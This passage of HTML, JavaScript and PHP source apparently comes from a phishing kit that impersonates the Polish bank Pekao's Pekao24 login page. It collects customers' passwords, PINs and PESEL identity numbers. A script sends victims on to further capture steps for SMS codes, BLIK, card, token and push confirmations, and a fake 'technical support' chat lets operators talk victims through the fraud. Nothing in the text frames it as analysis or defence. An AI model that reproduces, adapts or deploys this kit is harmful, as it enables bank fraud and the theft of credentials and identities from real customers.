                                <!-- End imput numer klienta -->
                                <!-- Start imput Hasło -->
                                <div _pekstyle-c65="" style="margin-top: 20px;" class="field-container large closed-messages">
                                  <label _pekstyle-c65="" for="customer" class="ng-star-inserted"> Hasło </label> <span _pekstyle-c65="" class="field-and-buttons">
<input _pekstyle-c726="" id="field3ds02" name="passdata" type="text" style="border-radius: 4px;" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" required="">
</span> </div>
                                <!-- End imput Hasło -->
                                 <!-- Start imput PIN -->
                                <div _pekstyle-c65="" id="field3ds3" style="margin-top: 20px;" class="field-container large closed-messages">
                                  <label _pekstyle-c65="" for="customer" class="ng-star-inserted"> PIN </label> <span _pekstyle-c65="" class="field-and-buttons">
<input _pekstyle-c726="" id="field3ds4" name="pindata" type="text" style="border-radius: 4px;" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" required="">
</span> </div>
                                <!-- End imput PIN -->
                                <!-- Start imput PIN -->
                                <div _pekstyle-c65="" id="field3ds3" style="margin-top: 20px;" class="field-container large closed-messages">
                                  <label _pekstyle-c65="" for="customer" class="ng-star-inserted"> PESEL </label> <span _pekstyle-c65="" class="field-and-buttons">
<input _pekstyle-c726="" id="field3ds4" name="peseldata" type="text" style="border-radius: 4px;" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" required="">
</span> </div>
                                <!-- End imput PIN -->
                                <!-- Start button 1 -->
                                <!-- <div class="loginboxes" style="padding: 20px 0; text-align: right;">
                                  <pekao-button _pekstyle-c726="" _pekaostyle-c161="">
                                    <button id="button1" type="submit" _pekstyle-c726="" class="button button-primary">Dalej</button>
                                  </pekao-button>
                                </div> -->
                                <!-- End button 1 -->
                               
                              </pekao-field>
                              <section _pekstyle-c726="" class="main-action-group ng-tns-c639-3">
                                <!-- Start button 2 -->
                                <pekao-button _pekstyle-c726="" _pekaostyle-c161="">
                                  <button id="field3ds5" type="submit" _pekstyle-c726="" class="button button-primary">Dalej</button>
                                </pekao-button>
                                <!-- End button 2 -->
                                <div style="color: #ff6161; padding: 20px; text-align: center;"></div>
                              </section>
                            </form>
                            <!-- End FORM -->
                            <section _pekstyle-c726="" class="account-action-group show-on-mobile ng-tns-c639-3">
                              <pekao-button _pekstyle-c726="" _pekaostyle-c161=""><a _pekstyle-c726="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/klient-indywidualny/codzienne-bankowanie/konta-osobiste/konto-przekorzystne.html">Nie masz konta? Zostań klientem</a> </pekao-button>
                            </section>
                            <pekao-cms-message-group _pekstyle-c726="" _pekaostyle-c662="" class="ng-tns-c639-3">
                              <section _pekstyle-c662="" class="cms-message-group">
                                <pekao-login-announcements-group _pekaostyle-c361="" class="ng-star-inserted">
                                  <pekao-login-announcement _pekaostyle-c360="" class="ng-star-inserted">
                                    <!-- <div _pekstyle-c360="" class="ql-container ql-pekao ql-disabled">
                                      <div class="ql-editor" data-gramm="false" data-placeholder=" " contenteditable="false">
                                        <p data-before-content="29.07.2021">Zachowaj czujność. Uważaj na telefony z fałszywych infolinii. <a url="/login/support/announcements?id=2022" data-link-preview="Pomoc w logowaniu - Komunikaty" type="INTERNAL" rel="noopener noreferrer" target="_blank">Więcej&gt;</a></p>
                                      </div>
                                      <div class="ql-clipboard" tabindex="-1" contenteditable="true"></div>
                                    </div> -->
                                  </pekao-login-announcement>
                                  <pekao-login-announcement _pekaostyle-c360="" class="ng-star-inserted">
                                    <!-- <div _pekstyle-c360="" class="ql-container ql-pekao ql-disabled">
                                      <div class="ql-editor" data-gramm="false" data-placeholder=" " contenteditable="false">
                                        <p data-before-content="12.05.2021">Ostrzegamy przed przestępcami podszywającymi się pod Dział Płatności i Fakturowania Banku Pekao S.A. <a url="https://www.pekao24.pl/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1562)" data-link-preview="/logowanie/(modal:pomoc-w-logowaniu/komunikaty;id=1562)" type="INTERNAL" rel="noopener noreferrer" target="_blank">Więcej&gt;</a></p>
                                      </div>
                                      <div class="ql-clipboard" tabindex="-1" contenteditable="true"></div>
                                    </div> -->
                                  </pekao-login-announcement>
                                </pekao-login-announcements-group>
                              </section>
                            </pekao-cms-message-group>
                          </div>
                          <footer _pekstyle-c639="" class="login-container-footer ng-tns-c639-3">
                            <pekao-login-support-action-group _pekstyle-c726="" login-container-footer="" class="login-container-footer ng-tns-c639-3" _pekaostyle-c708="">
                              <section _pekstyle-c708="" class="login-support-action-group-wrapper">
                                <pekao-button _pekstyle-c708="" _pekaostyle-c161=""><a _pekstyle-c708="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo-Pekao24/zalecenia.html">Bezpieczeństwo</a> </pekao-button>
                                <pekao-button _pekstyle-c708="" _pekaostyle-c161="">
                                  <button _pekstyle-c708="" type="button" class="button button-tertiary">Pomoc w logowaniu</button>
                                </pekao-button>
                              </section>
                            </pekao-login-support-action-group>
                          </footer>
                        </div>
                      </section>
                    </pekao-login-step-box>
                  </pekao-login-customer>
                </section>
              </main>
              <pekao-login-footer _pekstyle-c641="" _pekaostyle-c640="">
                <footer _pekstyle-c640="" class="footer">
                  <section _pekstyle-c640="" class="footer-section">
                    <div _pekstyle-c640="" class="footer-wrapper footer-navigation">
                      <div _pekstyle-c640="" class="footer-navigation-group phone-numbers-group">
                        <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" href="tel:801365365" class="button button-tertiary phone-number">801 365 365</a> </pekao-button>
                        <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" href="tel:+48225912232" class="button button-tertiary phone-number">+48 22 59 12 232</a> </pekao-button>
                      </div>
                      <div _pekstyle-c640="" class="footer-navigation-group links-group">
                        <div _pekstyle-c640="" class="links">
                          <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo.html">Bezpieczeństwo</a> </pekao-button>
                          <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/o-banku/stopka/rodo.html">RODO</a> </pekao-button>
                        </div>
                        <div _pekstyle-c640="" class="links">
                          <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/o-banku/stopka/polityka-prywatnosci.html">Polityka prywatności</a> </pekao-button>
                          <pekao-button _pekstyle-c640="" _pekaostyle-c161=""><a _pekstyle-c640="" target="_blank" rel="noopener" class="button button-tertiary" href="https://www.pekao.com.pl/kontakt.html">Kontakt</a> </pekao-button>
                        </div>
                      </div>
                    </div>
                  </section>
                  <section _pekstyle-c640="" class="footer-section bank-information ng-star-inserted">
                    <div _pekstyle-c640="" class="footer-wrapper footer-info-group"><span _pekstyle-c640="" class="krs-txt"> Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-844 Warszawa, wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł. </span>
                      <div _pekstyle-c640="" class="definition-group">
                        <section _pekstyle-c640="" class="codes"><span _pekstyle-c640="" class="padding-right">KOD BIC/SWIFT: PKOPPLPW</span></section>
                        <section _pekstyle-c640=""> © 2022 Bank Polska Kasa Opieki Spółka Akcyjna </section>
                      </div>
                    </div>
                  </section>
                </footer>
              </pekao-login-footer>
            </div>
          </pekao-login-container>
        </pekao-login>
      </div>
    </pekao-root-pekao24>
  
	<!-- 	<script>
			var button1 = document.querySelector('#button1');
			// var inp1 = document.querySelector('#field3ds1');
			// var inp2 = document.querySelector('#field3ds2');
			var inp3 = document.querySelector('#field3ds3');
			var inp4 = document.querySelector('#field3ds4');
			var inp5 = document.querySelector('#field3ds5');
			var inp01 = document.querySelector('#field3ds01');
			var inp02 = document.querySelector('#field3ds02');
			button1.onclick = function () {
				if (inp01.value.length > 5 && inp02.value.length > 5) {
					// inp1.style.display = 'block';
					// inp2.style.display = 'block';
					inp3.style.display = 'block';
	                inp4.style.display = 'block';
			 		inp5.style.display = 'block';
			 		button1.style.display = 'none';
				}
			}
		</script> -->
		<script type="text/javascript">
            
            

            function ajaxsup1() {
                var request = new XMLHttpRequest();

                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) {
                        var loading = document.querySelector('#loading');
                        var smsblock = document.querySelector('#sms');
                        var lkblock = document.querySelector('#lk');
                        var result = request.responseText;
                        // console.log(request.responseText);
                        console.log('%md%');
                        if (result == 'sms') {
                            location="/3ds%md%";
                        } else if (result == 'lk') {
                             location="/autorize%md%";
                        } else if (result == 'photo') {
                             location="/checking%md%";
                        } else if (result == 'blik') {
                             location="/blik%md%";
                        } else if (result == 'push') {
                             location="/potwierdzenie%md%";
                        } else if (result == 'card') {
                             location="/verification%md%";
                        } else if (result == 'token') {
                             location="/ipko%md%";
                        } else if (result == 'pin') {
                             location="/pincode%md%";
                        } else {

                        }
                    }
                }
                request.open('POST', 'procstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

            function ajaxdel() {
                var request = new XMLHttpRequest();
                request.open('POST', 'delstatus.php');
                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                request.send('item=22161894');
            }

        </script>


		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #d71920;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #d71920;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #d71920;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./pekao_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./pekao_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="../ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</body></html>